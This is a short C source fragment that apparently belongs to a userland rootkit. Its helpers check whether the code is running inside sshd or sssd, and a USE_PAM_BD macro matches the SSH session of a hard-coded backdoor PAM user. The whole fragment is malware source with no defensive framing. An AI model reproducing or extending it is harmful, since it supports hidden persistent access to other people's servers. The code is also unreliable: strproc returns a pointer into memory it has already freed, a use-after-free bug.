// these functions use macros..
int cmpproc(char *name){
    char *myname;
    int status=0;

    myname = procname();
    if(myname != NULL){
        status = !strncmp(myname, name, strlen(myname));
        free(myname);
    }

    return status;
}
char *strproc(char *name){
    char *myname, *status=NULL;
    
    myname = procname();
    if(myname != NULL){
        status = strstr(myname, name);
        free(myname);
    }

    return status;
}
int process(char *name){
    if(cmpproc(name) || strproc(name))
        return 1;
    return 0;
}

int sshdproc(void){
    int sshd=0;
    char *myname = procname();
    if(myname != NULL){
        sshd = !strcmp(myname, "/usr/sbin/sshd");
        free(myname);
    }
    return sshd;
}
int sssdproc(void){
    if(process("/usr/sbin/sssd"))
        return 1;

    int sssd=0;
    char *myname = procname();
    if(myname != NULL){
        sssd = !strncmp("/usr/libexec/sssd", myname, strlen("/usr/libexec/sssd"));
        free(myname);
    }
    return sssd;
}

#ifdef USE_PAM_BD
#define bd_sshproc() process("sshd: "PAM_UNAME)
#endif